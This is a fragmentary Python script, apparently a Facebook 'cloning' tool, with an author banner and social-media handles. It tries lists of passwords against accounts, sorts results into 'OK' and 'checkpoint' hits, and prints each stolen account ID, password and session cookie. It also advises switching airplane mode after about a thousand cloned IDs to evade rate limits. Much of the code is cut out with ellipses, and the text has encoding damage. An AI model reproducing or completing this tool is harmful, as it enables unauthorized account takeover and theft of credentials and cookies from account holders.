...
def banner():
	clear()
	sol()
	ban=''' Â© LEGEND AHSAM UL HAQOFFICIAL                     _
 _______                   
(  ___  )|\     /||\     /| [â€¢] Insta: Ahsam ul haq  
| (   ) || )   ( || )   ( |
| (___) || |   | || (___) | [â€¢] Facebook: Ahsam ul haq 
|  ___  || |   | ||  ___  |
| (   ) || |   | || (   ) |
| )   ( || (___) || )   ( |
|/     \|(_______)|/     \|    [â€¢] Master MindðŸ¥ºâ¤ï¸                                                     '''
...
def passwrd():
	...
	print('')
	print(f'=>RESULTS {AUH}OK{u} CHEK : {AUH}OK/%s {b}'%(okc))
	print(f'=>RESULTS {AUH}CP{h} CHEK : {AUH}CP/%s {b}'%(cpc))
	print(f'=>TURN AIRPLANE MODE AFTER CLONE IDZ ABOVE {AUH}1K{u} Idz\n')
	...
	print(f'[{h}â€¢{u}]{AUH} OK : {AUH}%s '%(ok))
	print(f'{k}[{k}â€¢{AUH}]{AUH} CP : {AUH}%s{AUH} '%(cp))
	print('')
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				cetak(nel('[green]      â¤ï¸âœ¨AUH-OK â¤ï¸âœ¨[green]')) 
		...
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				if 'no' in taplikasi:
					...
					statusok = f'[bold green][â€¢] ID       : {idf}\n[â€¢] PASSWORD : {pw}\n[â€¢] COOKIES  : {kuki}[/bold green]\n{infoakun}'
					statusok1 = nel(statusok, style='green')
					cetak(nel(statusok1, title='[bold green]AUH-XD OK[/bold green]'))
					ok+=1
					break
			else:
				continue
